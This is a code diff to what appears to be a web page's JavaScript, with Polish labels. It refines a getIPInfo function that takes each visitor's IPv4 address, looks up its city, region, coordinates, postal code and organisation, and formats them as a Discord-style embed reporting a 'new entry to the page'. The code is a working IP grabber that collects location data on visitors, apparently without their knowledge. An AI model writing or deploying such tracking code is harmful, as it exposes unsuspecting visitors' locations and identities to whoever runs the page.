@@ -29,10 +29,13 @@
 
         async function getIPInfo() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                const ipv4 = ipData.ip;
                 
-                const ip = data.ip || 'Nieznane';
+                const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+                const data = await geoResponse.json();
+                
                 const city = data.city || 'Brak';
                 const region = data.region || 'Brak';
                 const country = data.country_name || 'Brak';
@@ -42,22 +45,20 @@
                 const postal = data.postal || 'Brak';
                 const timezone = data.timezone || 'Brak';
                 const org = data.org || 'Brak';
-                const asn = data.asn || 'Brak';
                 
                 const embed = {
                     embeds: [{
                         title: "🌐 NOWE WEJŚCIE NA STRONĘ",
                         color: 0x2b2d31,
                         fields: [
-                            { name: "📡 IP", value: `\`${ip}\``, inline: true },
+                            { name: "📡 IP (IPv4)", value: `\`${ipv4}\``, inline: true },
                             { name: "🏙️ Miasto", value: city, inline: true },
                             { name: "🗺️ Region", value: region, inline: true },
                             { name: "🇵🇱 Kraj", value: `${country} (${countryCode})`, inline: true },
                             { name: "📍 Lokalizacja", value: `${latitude}, ${longitude}`, inline: true },
                             { name: "📮 Kod pocztowy", value: postal, inline: true },
                             { name: "⏰ Strefa czasowa", value: timezone, inline: true },
-                            { name: "🏢 Organizacja", value: org.substring(0, 50), inline: true },
-                            { name: "🔢 ASN", value: asn, inline: true }
+                            { name: "🏢 Organizacja", value: org.substring(0, 50), inline: true }
                         ],
                         footer: {
                             text: `Data wejścia: ${new Date().toLocaleString('pl-PL')}`
@@ -78,10 +79,10 @@
                 
                 const errorEmbed = {
                     embeds: [{
-                        title: "⚠️ Uproszczone IP (fallback)",
+                        title: "⚠️ Tylko IP (brak geo)",
                         color: 0xff6600,
                         fields: [
-                            { name: "IP", value: `\`${fallbackData.ip}\``, inline: true },
+                            { name: "IP (IPv4)", value: `\`${fallbackData.ip}\``, inline: true },
                             { name: "Błąd", value: error.toString(), inline: false }
                         ],
                         timestamp: new Date().toISOString()
